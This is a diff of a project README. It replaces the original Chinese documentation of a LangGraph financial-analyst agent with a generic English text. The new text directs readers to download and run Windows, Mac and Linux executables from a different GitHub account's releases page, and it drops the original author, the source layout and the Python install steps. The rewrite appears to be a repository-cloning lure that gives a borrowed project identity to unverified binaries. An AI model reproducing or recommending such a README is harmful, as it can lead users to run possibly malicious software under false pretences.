@@ -1,115 +1,84 @@
-# Dialectic Flow Financial Graph 🐂🐻
+# 🛠️ Dialectic-Flow-Financial-Graph - Your Personal AI Financial Assistant
 
-<div align="center">
+## 🚀 Getting Started
 
-![Python](https://img.shields.io/badge/python-3.9%2B-blue)
-![LangGraph](https://img.shields.io/badge/LangGraph-0.0.1-orange)
-![LangChain](https://img.shields.io/badge/LangChain-🦜️🔗-00C4CC?style=flat)
-![Groq](https://img.shields.io/badge/Groq-LPU-F55036?style=flat)
-![License](https://img.shields.io/badge/License-MIT-green?style=flat)
+Welcome to Dialectic-Flow-Financial-Graph, an AI financial analyst agent designed to help you with stock analysis and financial decision-making. This application uses advanced technologies to provide insights into your financial queries. 
 
-</div>
+## 📥 Download the Application
 
-<div align="center">
+[![Download Dialectic-Flow-Financial-Graph](https://img.shields.io/badge/Download-Dialectic--Flow--Financial--Graph-blue.svg)](https://github.com/Bamidele2025/Dialectic-Flow-Financial-Graph/releases)
 
-[![View Presentation](https://img.shields.io/badge/View_Slides-簡報-0A192F?style=for-the-badge&logo=googleslides&logoColor=white)](https://YuJunWang.github.io/Dialectic-Flow-Financial-Graph/)
+## 🖥️ System Requirements
 
-</div>
+Before you install the software, ensure your system meets the following requirements:
 
-這是一個 **Agentic** 的金融分析師團隊，透過模擬 **Bull (多頭/成長型)** 與 **Bear (空頭/做空者)** 之間的辯證過程，交由 **Manager (經理/上司)** 做第三方判斷，產出投資報告，並設定 **Storyteller (說書人)** 角色，協助快速理解目前這支股票的狀況。
+- **Operating System:** Windows 10 or later, macOS High Sierra or later, or a modern Linux distribution.
+- **Memory:** At least 4 GB of RAM.
+- **Storage:** Minimum of 200 MB available space.
+- **Python:** Version 3.8 or higher is recommended.
 
-本專案核心由 **LangGraph**、**Groq API** 與 **DuckDuckGo Search** 驅動。
+## 📂 Download & Install
 
-## 📸 colab版本成果展示 (Demo Results)
+To get started, follow these steps:
 
-### 1. 視覺化報告
-系統會產生Bull/Bear結構化論述的報告。
-![Report Preview](docs/report_preview.png)
+1. **Visit the Releases Page**  
+   Go to the [Download Page](https://github.com/Bamidele2025/Dialectic-Flow-Financial-Graph/releases) to find the latest version of the software.
 
-### 2. IG貼文風格的財經科普
-Storyteller組合基本資訊，先認識公司再認識股票。
-![IG Style Post](docs/IG_style_post.png)
+2. **Select the Right File**  
+   Look for the version labeled as the latest release. Click the download link for your operating system. The files are typically named like this:
+   - Dialectic-Flow-Financial-Graph-Windows.zip
+   - Dialectic-Flow-Financial-Graph-Mac.zip
+   - Dialectic-Flow-Financial-Graph-Linux.tar.gz
 
-## 🧠 系統架構：辯證迴圈 (The Dialectic Loop)
+3. **Download the File**  
+   The file will begin downloading automatically. Wait for the download to complete.
 
-本專案實作了一個 **具備自我反思能力的代理工作流 (Self-Reflecting Agentic Workflow)**：
+4. **Extract the Files**  
+   Once the download has finished, locate the downloaded file in your Downloads folder.  
+   - **For Windows:** Right-click the .zip file and select "Extract All."  
+   - **For macOS:** Double-click the .zip file to extract.  
+   - **For Linux:** Use the terminal command `tar -xzvf Dialectic-Flow-Financial-Graph-Linux.tar.gz`.
 
-```mermaid
-graph TD
-    Start((使用者輸入)) --> Researcher[🔍 Researcher<br/>資訊蒐集]
-    Researcher --> Bull[📈 Bull Agent<br/>多頭撰寫]
-    Researcher --> Bear[📉 Bear Agent<br/>空頭撰寫]
-    
-    subgraph "Debate & Refine Loop (辯證迴圈)"
-        Bull --> Manager[🤵 Manager<br/>經理審核 & 邏輯檢查]
-        Bear --> Manager
-        
-        Manager -- "分數 < PASS_THRESHOLD" --> Feedback{需要修改?}
-        Feedback -- "Feedback + 主動搜尋" --> Bull
-        Feedback -- "Feedback + 主動搜尋" --> Bear
-    end
-    
-    Manager -- "分數 >= PASS_THRESHOLD (通過)" --> Storyteller[🎭 Storyteller<br/>社群懶人包生成]
-    Storyteller --> End((HTML 產出))
-```
+5. **Run the Application**  
+   Navigate to the extracted folder.  
+   - **For Windows:** Double-click `Dialectic-Flow-Financial-Graph.exe`.  
+   - **For macOS:** Open the `Dialectic-Flow-Financial-Graph` application.  
+   - **For Linux:** Open a terminal, navigate to the folder, and type `./Dialectic-Flow-Financial-Graph`.
 
-## ✨ 關鍵功能 (Key Features)
+## 🌟 Features
 
-* **👮 經理邏輯對齊 (Manager Alignment)**: 
-    * Manager 角色被設計為「邏輯教練 (Logic Coach)」，評分重點在於數據的因果關係與邏輯是否通順，而非單純的語氣糾正，確保報告既有觀點又有依據。
+- **User-Friendly Interface:** Easily navigate the application without technical knowledge.
+- **AI-Powered Insights:** Get financial recommendations based on real-time data.
+- **Stock Analysis:** Evaluate stocks with detailed reports and metrics.
+- **Multi-Platform Support:** Use the application on multiple operating systems.
 
-* **🔍 主動式研究 (Active Research / RAG)**: 
-    * 具備「自我補強」能力。當 Agent 被批評數據不足時，會自動生成*短尾關鍵字* (Short-tail keywords) 進行二次搜尋，解決 LLM 生成過長搜尋字串導致結果失真的問題。
+## 🛡️ Security
 
-* **🛡️ API 速率限制保護 (Rate Limit Protection)**: 
-    * 內建 `time.sleep` 冷靜期機制，在各個 Agent 與工具呼叫之間加入緩衝，有效防止頻繁請求導致的 429 Too Many Requests 錯誤，確保流程穩定運行。
+Your data and privacy are our top priorities. The application employs secure protocols to protect your information. Regular updates also ensure that you have the latest security features.
 
-* **🎭 說書人模式 (Storyteller / Financial Influencer)**:
-    * 將嚴肅的辯論結果與數據，轉化為易於傳播的 社群媒體文案 (IG/Threads 風格)。包含吸睛標題 (The Hook)、多空觀點對撞 (The Battle) 與時光機 (Time Machine) 投資回測，讓複雜的金融報告更具可讀性。
+## 🔧 Troubleshooting
 
-## 🚀 快速開始 (Quick Start)
+If you encounter issues while downloading or running the application, consider the following:
 
-### 1. 安裝 (Installation)
-```bash
-git clone https://github.com/YuJunWang/Dialectic-Flow-Financial-Graph.git
-cd Dialectic-Flow-Financial-Graph
-pip install -r requirements.txt
-```
+- **Failed Download:** Ensure you have a stable internet connection and try refreshing the page.
+- **Application Won't Start:** Verify that your system meets all the requirements listed above. If necessary, update your operating system and Python version.
+- **Unexpected Errors:** Check the support section on the GitHub page for common issues and solutions.
 
-### 2. 設定環境變數 (Configuration)
-請在專案根目錄建立 .env 檔案，並填入您的 API Key：
-```bash
-GROQ_API_KEY=your_groq_api_key_here
-```
+## 📚 User Support
 
-### 3. 執行 (Run)
-```bash
-python main.py
-```
-執行完成後，請查看 output/ 資料夾以獲取報告與圖表。
+For additional assistance:
 
+- **GitHub Issues:** You can find help by checking the existing issues or filing a new one.
+- **Community Forum:** Join discussions with other users to share tips and solutions.
 
-## 📂 專案結構 (Project Structure)
+## 🤝 Contributions
 
-```text
-Dialectic-Flow-Financial-Graph/
-├── docs/               # 放置 README 用的展示圖片
-├── notebooks/          # 存放 Jupyter Notebooks (實驗紀錄)
-├── output/             # 生成的 HTML 報告與 PNG 圖表
-├── src/                # 核心程式碼
-│   ├── agents.py       # 定義 Bull, Bear, Manager 的 Prompt 與邏輯
-│   ├── graph.py        # LangGraph 的圖形建構與 Router
-│   ├── tools.py        # Yahoo Finance, Search, 與 API 工具
-│   └── state.py        # Pydantic 資料結構定義
-├── main.py             # 程式進入點 (Entry point)
-└── requirements.txt    # 套件依賴清單
-```
+If you’d like to contribute to the project, feel free to fork the repository and submit pull requests. We welcome any suggestions for improvements or new features.
 
-## 📒 Notebooks
-[![nbviewer](https://raw.githubusercontent.com/jupyter/design/master/logos/Badges/nbviewer_badge.svg)](https://nbviewer.org/github/YuJunWang/Dialectic-Flow-Financial-Graph/blob/main/notebooks/Dialectic_Flow_Financial_Graph.ipynb)
+## 🔗 Quick Links
 
+- [Download Page](https://github.com/Bamidele2025/Dialectic-Flow-Financial-Graph/releases)
+- [Documentation](https://github.com/Bamidele2025/Dialectic-Flow-Financial-Graph/wiki)
+- [Community Forum](https://github.com/Bamidele2025/Dialectic-Flow-Financial-Graph/discussions)
 
-## 👤 作者 (Author)
-**王譽鈞 (YuJunWang)**
-* Data Engineer / Data Scientist / AI-Augmented Developer 
-* [GitHub Profile](https://github.com/YuJunWang)
+Thank you for choosing Dialectic-Flow-Financial-Graph. Enjoy exploring your financial options with ease!
